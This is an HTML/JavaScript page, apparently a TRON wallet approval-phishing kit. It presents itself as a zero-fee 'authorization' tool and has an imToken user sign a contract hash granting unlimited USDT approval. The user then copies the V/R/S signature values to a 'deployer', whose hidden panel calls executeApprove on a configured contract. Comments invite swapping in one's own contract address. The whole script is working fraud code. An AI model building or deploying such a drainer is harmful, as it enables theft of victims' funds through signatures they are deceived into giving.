<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>简化版代付授权工具</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: Roboto, sans-serif;
            padding: 20px; max-width: 500px; margin: 0 auto; 
            background: #121a17; color: #e0e8e4;
        }
        .card { 
            background: #1e2925; padding: 18px; border-radius: 8px; 
            border: 1px solid #334155; margin-bottom: 15px;
        }
        .card-title { color: #3b82f6; font-size: 16px; margin-bottom: 12px; }
        .info-item { margin: 10px 0; font-size: 14px; }
        .info-item strong { color: #3b82f6; display: inline-block; width: 80px; }
        .hash-display { 
            background: #121a17; padding: 10px; border-radius: 6px;
            font-family: monospace; font-size: 13px; word-break: break-all;
            color: #4ade80; margin: 10px 0;
        }
        .btn { 
            width: 100%; padding: 14px; background: #2563eb; color: white;
            border: none; border-radius: 8px; font-size: 15px; cursor: pointer;
            margin-top: 10px;
        }
        .btn:disabled { background: #294b75; cursor: not-allowed; }
        .btn-owner { background: #8b5cf6; }
        .toast { 
            position: fixed; top: 20px; left: 50%; transform: translateX(-50%);
            padding: 12px 20px; background: #1e2925; border: 1px solid #3b82f6;
            color: #e0e8e4; border-radius: 6px; display: none; z-index: 999;
        }
    </style>
</head>
<body>
    <div class="card">
        <div class="card-title">授权者操作（零费用）</div>
        <div class="info-item"><strong>钱包地址：</strong><span id="userAddr">未连接</span></div>
        <div class="info-item"><strong>授权金额：</strong>无限（固定）</div>
        <div class="info-item"><strong>合约哈希：</strong></div>
        <div class="hash-display" id="contractHash">未生成</div>
    </div>

    <div class="card">
        <div class="card-title">签名结果（复制给部署者）</div>
        <div class="info-item"><strong>V值：</strong><span id="vValue">--</span></div>
        <div class="info-item"><strong>R值：</strong><span id="rValue">--</span></div>
        <div class="info-item"><strong>S值：</strong><span id="sValue">--</span></div>
    </div>

    <div class="card" style="display: none;" id="ownerCard">
        <div class="card-title">部署者操作</div>
        <div class="info-item"><strong>授权者地址：</strong><input type="text" id="ownerUser" placeholder="输入授权者地址" style="width: 200px; padding: 6px; background: #121a17; color: #e0e8e4; border: 1px solid #334155; border-radius: 4px;"></div>
        <div class="info-item"><strong>V值：</strong><input type="text" id="ownerV" placeholder="输入V值" style="width: 200px; padding: 6px; background: #121a17; color: #e0e8e4; border: 1px solid #334155; border-radius: 4px;"></div>
        <div class="info-item"><strong>R值：</strong><input type="text" id="ownerR" placeholder="输入R值" style="width: 200px; padding: 6px; background: #121a17; color: #e0e8e4; border: 1px solid #334155; border-radius: 4px;"></div>
        <div class="info-item"><strong>S值：</strong><input type="text" id="ownerS" placeholder="输入S值" style="width: 200px; padding: 6px; background: #121a17; color: #e0e8e4; border: 1px solid #334155; border-radius: 4px;"></div>
        <button id="executeBtn" class="btn btn-owner">执行无限授权</button>
    </div>

    <button id="connectBtn" class="btn">连接imToken钱包</button>
    <button id="genHashBtn" class="btn" disabled>生成合约哈希</button>
    <button id="signBtn" class="btn" disabled>签名哈希（零费用）</button>
    <button id="copyBtn" class="btn" disabled>复制V/R/S</button>

    <div class="toast" id="toast"></div>

    <script>
        // 配置：替换为你的合约信息
        const CONFIG = {
            CONTRACT_ADDR: "THeU99vLEAS7Jym97cb1s3TnwQi6doTeX9",
            USDT_ADDR: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t" // TRON主网USDT
        };

        let tronWeb, userAddress, contract;
        let messageHash = "";

        window.onload = () => {
            const connectBtn = document.getElementById("connectBtn");
            const genHashBtn = document.getElementById("genHashBtn");
            const signBtn = document.getElementById("signBtn");
            const copyBtn = document.getElementById("copyBtn");
            const executeBtn = document.getElementById("executeBtn");

            // 初始化合约
            if (window.tronWeb) {
                tronWeb = window.tronWeb;
                contract = tronWeb.contract().at(CONFIG.CONTRACT_ADDR);
            }

            // 连接钱包
            connectBtn.onclick = async () => {
                try {
                    const accounts = await tronWeb.request({ method: "tron_requestAccounts" });
                    userAddress = accounts[0];
                    document.getElementById("userAddr").textContent = userAddress.slice(0,8)+"..."+userAddress.slice(-6);
                    // 检测是否为部署者
                    if (userAddress === "你的部署者地址") {
                        document.getElementById("ownerCard").style.display = "block";
                    }
                    connectBtn.disabled = true;
                    genHashBtn.disabled = false;
                    showToast("钱包连接成功");
                } catch (e) {
                    showToast(`连接失败：${e.message}`);
                }
            };

            // 生成哈希（固定无限授权）
            genHashBtn.onclick = async () => {
                try {
                    messageHash = await contract.generateHash(userAddress).call();
                    document.getElementById("contractHash").textContent = messageHash;
                    genHashBtn.disabled = true;
                    signBtn.disabled = false;
                    showToast("哈希生成成功");
                } catch (e) {
                    showToast(`生成失败：${e.message}`);
                }
            };

            // 签名哈希（imToken零费用）
            signBtn.onclick = async () => {
                try {
                    const prefix = "\x19Ethereum Signed Message:\n32";
                    const prefixHex = asciiToHex(prefix);
                    const signedHash = tronWeb.sha3(prefixHex + messageHash.slice(2), true);
                    const signature = await tronWeb.trx.sign(signedHash);
                    
                    // 解析V/R/S
                    const sig = signature.replace(/^0x/, "");
                    const v = parseInt(sig.slice(128,130), 16) + 27;
                    const r = "0x" + sig.slice(0,64);
                    const s = "0x" + sig.slice(64,128);

                    document.getElementById("vValue").textContent = v;
                    document.getElementById("rValue").textContent = r;
                    document.getElementById("sValue").textContent = s;
                    signBtn.disabled = true;
                    copyBtn.disabled = false;
                    showToast("签名成功");
                } catch (e) {
                    showToast(`签名失败：${e.message}`);
                }
            };

            // 复制V/R/S
            copyBtn.onclick = () => {
                const content = `用户地址：${userAddress}\nV: ${document.getElementById("vValue").textContent}\nR: ${document.getElementById("rValue").textContent}\nS: ${document.getElementById("sValue").textContent}`;
                navigator.clipboard.writeText(content);
                showToast("已复制V/R/S");
            };

            // 部署者执行授权
            executeBtn.onclick = async () => {
                try {
                    const user = document.getElementById("ownerUser").value;
                    const v = parseInt(document.getElementById("ownerV").value);
                    const r = document.getElementById("ownerR").value;
                    const s = document.getElementById("ownerS").value;
                    
                    const result = await contract.executeApprove(user, v, r, s).send({ feeLimit: 100000000 });
                    if (result.result) showToast("授权执行成功");
                } catch (e) {
                    showToast(`执行失败：${e.message}`);
                }
            };
        };

        // 辅助函数
        function asciiToHex(str) {
            let hex = "";
            for (let i = 0; i < str.length; i++) {
                hex += str.charCodeAt(i).toString(16).padStart(2, "0");
            }
            return hex;
        }

        function showToast(msg) {
            const toast = document.getElementById("toast");
            toast.textContent = msg;
            toast.style.display = "block";
            setTimeout(() => toast.style.display = "none", 3000);
        }
    </script>
</body>
</html>         
